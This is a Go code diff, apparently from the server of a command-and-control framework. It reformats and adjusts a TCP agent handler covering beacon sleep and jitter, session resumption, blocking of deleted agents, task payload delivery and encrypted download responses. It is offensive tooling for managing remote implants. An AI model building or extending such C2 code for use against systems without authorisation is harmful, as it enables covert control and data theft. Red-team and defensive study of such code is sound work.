@@ -185,10 +185,14 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 	if transport == "" {
 		transport = "tcp"
 	}
-	sleepSec  := req.SleepSec
+	sleepSec := req.SleepSec
 	jitterPct := req.JitterPct
-	if sleepSec  <= 0 { sleepSec  = 5 }
-	if jitterPct <  0 { jitterPct = 20 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
+	if jitterPct < 0 {
+		jitterPct = 20
+	}
 
 	// Session resumption: if the agent sends its old ID and it exists in the DB,
 	// reuse it instead of minting a new UUID. A fresh AES key is always negotiated
@@ -201,7 +205,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 			s.printf("[!] TCP: blocked re-registration of deleted agent %s\n", req.ResumeID[:8])
 			return
 		}
-		// Always honour the preset ID — even if the DB record was deleted.
+		// Honour the preset ID when it is not blocked by the deleted-agent list.
 		// If found: true resume (first_seen preserved). If not found: use the
 		// preset ID as the new agentID so the binary keeps its stable identity.
 		agentID = req.ResumeID
@@ -259,7 +263,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 	// ── 2. Beacon loop ─────────────────────────────────────────────────
 	conn.SetDeadline(time.Time{}) // no global deadline; per-read below
 	disconnectReason := "connection closed"
-	beaconLoop:
+beaconLoop:
 	for {
 		conn.SetDeadline(time.Now().Add(4 * time.Hour))
 		frame, err := tcpReadFrame(conn)
@@ -317,7 +321,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 				tw := taskWire{ID: t.ID, Type: t.Type, Args: t.Args}
 				if len(t.Payload) > 0 {
 					tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
-			}
+				}
 				wires = append(wires, tw)
 			}
 			var peers []peerWire
@@ -581,8 +585,9 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 			}
 			// Send "dl_resp" with base64 data (empty string means not found / error).
 			dlResp := struct {
-				Data string `json:"data"`
-			}{Data: base64.StdEncoding.EncodeToString(dlData)}
+				Data  string `json:"data"`
+				Found bool   `json:"found"`
+			}{Data: base64.StdEncoding.EncodeToString(dlData), Found: dlData != nil}
 			dlJSON, _ := json.Marshal(dlResp)
 			dlEnc, encErr := Seal(key, dlJSON)
 			if encErr != nil {
